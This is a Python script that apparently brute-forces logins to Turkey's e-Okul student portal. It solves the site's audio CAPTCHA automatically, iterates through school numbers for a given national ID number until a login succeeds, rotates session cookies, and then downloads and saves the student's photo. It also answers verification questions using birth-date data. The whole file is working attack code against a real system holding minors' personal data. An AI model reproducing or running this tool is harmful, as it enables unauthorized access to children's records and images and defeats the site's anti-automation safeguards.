import requests
from bs4 import BeautifulSoup
import random
import time
from colorama import Fore
import AudioConverter as AC
import Utils
import os
import time
import re

class Forcer:
    def __init__(self, tckn, birthday, birthmonth, birthyear):
        self.__base_url = "https://e-okul.meb.gov.tr/"
        self.__login_url = f"{self.__base_url}logineOkul.aspx/VBSGiris"
        self.__image_source_url = f"{self.__base_url}IlkOgretim/VELI/IOV00002.aspx"
        self.__headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
            "Origin": self.__base_url,
            "Accept": "application/json, text/javascript, */*; q=0.01"
        }
        self.__tckn = tckn
        self.__temp_test_number = "some_value"  # Define __temp_test_number here
        self.birthday = birthday
        self.birthmonth = birthmonth
        self.birthyear = birthyear
        self.cookies = self.get_cookies()

    def get_cookies(self):
        response = requests.get(self.__base_url, headers=self.__headers)
        cookies = {'ASP.NET_SessionId': response.cookies["ASP.NET_SessionId"]}
        return cookies
    
    def change_cookies(self):
        response = requests.get(self.__base_url, headers=self.__headers)
        cookies = {'ASP.NET_SessionId': response.cookies["ASP.NET_SessionId"]}
        self.cookies = cookies

    # use eokul api to login
    def login(self, eokul_no):
        captcha_code = self.get_captcha_code()

        payload = {"Keys": ["gkod", "txtKullaniciAd", "sifre"],
                "Degerler": [captcha_code, self.__tckn, eokul_no]}

        r = requests.post(self.__login_url, json=payload, headers=self.__headers, cookies=self.cookies)

        print("Response:", r.text)

        if "message" in r.json().get("d", [{}])[0]:
            message = r.json()["d"][0]["message"]
            response = r.json()["d"][0]
            print("Message:", message)
            return message, response
        elif "success" in r.json()["d"][0]["success"] == True:
            return message, response
        else:
            return "Unknown Error", None
    # get raw jpeg images data
# get raw jpeg images data
    def get_images(self):
        max_redirects = 5  # Max yönlendirme sayısı
        response = requests.get("https://e-okul.meb.gov.tr/IlkOgretim/VELI/IOV00002.aspx/", headers=self.__headers, cookies=self.cookies)
        image_parents = BeautifulSoup(response.text, "html.parser").findAll("div", {"class": "card-body text-center"})
        # print(image_parents)
        image_urls = []
        for image_parent in image_parents:
            img_element = image_parent.find("img")
            if img_element and "src" in img_element.attrs and img_element["src"]:
                image_src = img_element["src"]
                if "../IOVResim" in image_src:
                    image_src = image_src.replace("../IOVResim", "IlkOgretim/VELI/IOVResim")
                    image_url = self.__base_url + image_src
                    image_urls.append(image_url)
        # print(image_urls[0])
        if image_urls:
            req = requests.get(image_urls[0], headers=self.__headers, cookies=self.cookies)
            soup = BeautifulSoup(req.text, 'html.parser')
            form_action = soup.find('form')['action']

            # URL'yi düzenleyerek resim URL'sini elde edelim
            base_url = "https://e-okul.meb.gov.tr/IlkOgretim/VELI/"
            image_id = form_action.split('=')[-1]
            match = re.search(r'IOVResim(\d+)\.aspx', form_action)
            image_url = f"{base_url}{match.group()}?id={image_id}"

            # Resmi indirip kaydedelim
            response = requests.get(image_url, headers=self.__headers, cookies=self.cookies)
            Utils.show_save_passport(Utils.change_image_size(response.content), self.__tckn)
            return True
        else:
            print("Resim URL'leri bulunamadı.")
        # if response.status_code == 200:
        #     img = Utils.change_image_size(response.content)
        #     image_path = f"{self.__tckn}.jpg"
        #     with open(image_path, 'wb') as f:
        #         f.write(img)
        #     print(f"Resim başarıyla indirildi ve '{image_path}' adıyla kaydedildi.")
        # else:
        #     print("Resim indirme işlemi başarısız oldu.")
        # resized_image_contents = []
        # for image_url in image_urls:
        #     image_content = requests.get(image_url, headers=self.__headers, cookies=self.cookies).content
        #     resized_image_contents.append(Utils.change_image_size(image_content))

        # real_passport_index = self.detect_real_passport(response.text)
        # if not real_passport_index:
        #     print("Gerçek pasaport bulunamadı.")
        #     return None
        # elif real_passport_index == "False":
        #     print("False değeri döndü: Gerçek pasaport bulunamadı.")
        #     return None

        # real_passport_image = resized_image_contents[int(real_passport_index)]
        # return [resized_image_contents, real_passport_image]

        # image_parents = BeautifulSoup(response.text, "html.parser").findAll("div", {"class": "row"})
        # print(response, image_parents)

        # if not image_parents:
        #     print("Resimler bulunamadı.")
        #     return None

        # image_urls = [self.__image_source_url + image_parent.find("img").get("src") for image_parent in image_parents]

        # resized_image_contents = []
        # for image_url in image_urls:
        #     image_content = requests.get(image_url, headers=self.__headers, cookies=self.cookies).content
        #     resized_image_contents.append(Utils.change_image_size(image_content))

        # real_passport_index = self.detect_real_passport(response.text)
        # if not real_passport_index:
        #     print("Gerçek pasaport bulunamadı.")
        #     return None
        # elif real_passport_index == "False":
        #     print("False değeri döndü: Gerçek pasaport bulunamadı.")
        #     return None

        # real_passport_image = resized_image_contents[int(real_passport_index)]
        # return [resized_image_contents, real_passport_image]








    # solve questions
    def detect_real_passport(self, html):
        questions = self.get_questions(html)

        if questions:
            
            # send requests to test check image
            payload = {}
            rand_index = random.randint(0,4)

            viewstates = Utils.get_viewstates(html)
            data = Utils.get_configured_data(rand_index, questions, self.birthday, self.birthmonth, self.birthyear)

            payload.update(viewstates)
            payload.update(data)
            
            # debug dont remove
            response = requests.post("https://e-okul.meb.gov.tr/IlkOgretim/VELI/IOV00002.aspx", cookies=self.cookies, headers=self.__headers, data=payload, allow_redirects=True)
            isLoggedIn = BeautifulSoup(response.text, "html.parser").find_all("div", {"class": "alert alert-danger"})
            print(response)

            if not isLoggedIn:
                return str(rand_index)

            return False
        
        return False

    # get asked verification questions
    def get_questions(self, html):
        soup = BeautifulSoup(html, "html.parser")
        question_labels = soup.find_all("label", {"for": "ogrenci"})
        questions = [*map(lambda questions_label: questions_label.find("span"), question_labels)]
        filtered_questions = [*filter(lambda question: question.text.strip() in Utils.SOLVE_ABLE_QUESTIONS, questions)]
        
        if len(filtered_questions) == 2:
            return filtered_questions

        self.change_cookies()

    # get ogg file download url
    def get_captcha_url(self):
        response = requests.get(self.__base_url, headers=self.__headers, cookies=self.cookies)
        soup = BeautifulSoup(response.text, "html.parser")
        audio_tag = soup.find("audio")
        
        if audio_tag:
            source_tag = audio_tag.find("source")
            if source_tag:
                url = source_tag.get("src")
                if not url.startswith("http"):
                    url = self.__base_url + url
                return url
        return None

    # change captcha when cant recognize
    def change_captcha(self):
        payload = {"Keys": ["gkod", "txtKullaniciAd", "sifre"], "Degerler": [
            self.__temp_test_number, self.__tckn, "532"]}
        requests.post("https://e-okul.meb.gov.tr/logineOkul.aspx/VBSGiris", json=payload,
                      headers=self.__headers, cookies=self.cookies)

    # get raw data of ogg file and conver it to text
    def get_captcha_code(self):
        raw_ogg = requests.get(
            self.get_captcha_url(),
            headers=self.__headers,
            cookies=self.cookies,
            stream=True
        ).content
        captcha_code = AC.direct_get_from_ogg(raw_ogg)
        if not captcha_code:
            print(Fore.RED + "Captcha Çözümlenemedi Yeniden Deneniyor !" + Fore.RESET)
            return self.get_captcha_code()
        return captcha_code

    # if tckn wrong, warn user
    def check_tckn(self):
        message = self.login(self.__temp_test_number)
        if message.startswith("Öğrenci T.C. Kimlik No Alanına"):
            print("!Yanlış Tckn Girdiniz Böyle Bir Tckn Bulunmamaktadır.!")
            quit()


def get_image_content(url):
    response = requests.get(url)
    if response.status_code == 200:
        return response.content
    else:
        return None

def runner(tckn, day, month, year):
    forcer = Forcer(tckn, day, month, year)
    start_time = time.time()

    def passport_runner(eokul_no):
        test_size = 0
        eokulnumara = 1
        change_cookies = True  # İlk başta change_cookies işlemi yapacak

        while True:
            print(f"T.C. Kimlik No: {tckn}, e-okul No: {eokulnumara}")
            eokulnumara += 1
            test_size += 1
            captcha_code = forcer.get_captcha_code()

            payload = {"Keys": ["gkod", "txtKullaniciAd", "sifre"],
                    "Degerler": [captcha_code, tckn, eokulnumara]}
            __headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
                "Origin": "https://e-okul.meb.gov.tr/",
                "Accept": "application/json, text/javascript, */*; q=0.01"
            }
            r = requests.post("https://e-okul.meb.gov.tr/logineOkul.aspx/VBSGiris", json=payload, headers=__headers, cookies=forcer.cookies)

            try:
                response_data = r.json()["d"][0]
                if "success" in response_data and response_data["success"] == True:
                    print(f"E OKUL NUMARASI BULUNDU !!! {eokulnumara}")
                    change_cookies = False  # Artık change_cookies işlemi yapmayacak
                    break  # Döngüyü sonlandır

            except (KeyError, ValueError, IndexError) as e:
                print("JSON parse error:", e)
            
            if change_cookies:  # change_cookies işlemi yapılacak mı kontrolü
                forcer.change_cookies()

        images = forcer.get_images()
        if images == True:
            Utils.show_save_general(tckn, eokulnumara, start_time, test_size)
            return True
            # print("Vesikalık deneniyor.")
            # match = re.search(r'id=(\d+)', images)
            # if match:
            #     print(match.group(1))
            #     __headers = {
            #             "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
            #             "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"
            #     }
            #     data = {
            #         "id": match.group(1)
            #     }
            #     ekalps = requests.get(images, cookies=forcer.cookies)
                # ekalps = requests.get(forcer.get_images(), headers=__headers, cookies=forcer.cookies, data=data)
                # # print(ekalps.text)
                # # print(images)
                # print(ekalps.text)

            # Eklenen kod kısmı
            # if "url" in response_data and "/IlkOgretim/VELI/IOV00002.aspx" in response_data["url"]:
                # print(images)
                
                # Utils.show_save_general(tckn, eokul_no, start_time)
                # Utils.show_save_passport(images, tckn)
                # image_content = get_image_content(images)
                # __headers = {
                #     "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
                #     "Origin": "https://e-okul.meb.gov.tr/",
                #     "Accept": "application/json, text/javascript, */*; q=0.01"
                # }
                # image_response = requests.get(
                #     "https://e-okul.meb.gov.tr/" + response_data["url"], headers=__headers, cookies=forcer.cookies)

                # soup = BeautifulSoup(image_response.text, "html.parser")
                # image_src = soup.find("img", class_="row")  # Class isim düzeltilmeli

                # if image_src and "src" in image_src.attrs:
                #     image_url = "https://e-okul.meb.gov.tr/IlkOgretim/VELI/" + image_src["src"]
                #     image_content = requests.get(
                #         image_url, headers=__headers, cookies=forcer.cookies).content

                #     with open("results/result_image.jpg", "wb") as f:
                #         f.write(image_content)
                #     print("Resim results klasörüne kaydedildi.")
                #     print(images)
    for eokul_no in range(Utils.MIN_EOKUL_NO_LIMIT, Utils.MAX_EOKUL_NO_LIMIT+1):
        if passport_runner(eokul_no):
            break